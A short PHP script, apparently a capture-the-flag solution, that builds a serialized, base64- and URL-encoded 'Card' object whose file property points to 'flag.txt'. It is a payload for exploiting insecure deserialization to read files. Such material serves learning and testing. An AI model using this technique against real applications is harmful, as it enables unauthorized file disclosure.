<?php
class Card{
    public $file;
}

$card = new Card;
$card->file = 'flag.txt';

echo urlencode(base64_encode(serialize($card)));
?>